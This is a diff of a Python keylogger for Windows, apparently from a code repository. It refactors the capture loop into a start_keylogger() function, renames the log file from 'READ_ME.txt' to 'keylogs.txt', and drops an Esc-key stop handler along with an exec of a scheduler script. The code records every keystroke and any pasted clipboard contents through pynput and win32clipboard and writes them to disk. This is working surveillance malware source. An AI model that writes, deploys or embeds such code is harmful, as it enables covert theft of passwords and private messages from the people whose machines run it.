@@ -8,16 +8,13 @@ hllDll = ctypes.WinDLL("User32.dll")
 
 
 def add_data(x):
-    global answer
     print(x)
-    answer = answer + x
-    f = open("READ_ME.txt", "a")
+    f = open("keylogs.txt", "a")
     f.write(x)
     f.close()
 
 
 def on_press(key):
-    global answer
     print(str(key))
     if str(key).encode() == b"'\\x16'":  # paste
         win32clipboard.OpenClipboard()
@@ -34,17 +31,7 @@ def on_press(key):
         add_data(x)
 
 
-def on_release(key):
-    global answer
-    if key == Key.esc:
-        # Stop listener
-        print(answer)
-        answer=""
-
-
-# Collect events until released
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    answer = ""
-    listener.join()
-    print(answer)
-exec(open("scheduler.py").read())
+def start_keylogger():
+    # Collect events until released
+    with Listener(on_press=on_press) as listener:
+        listener.join()
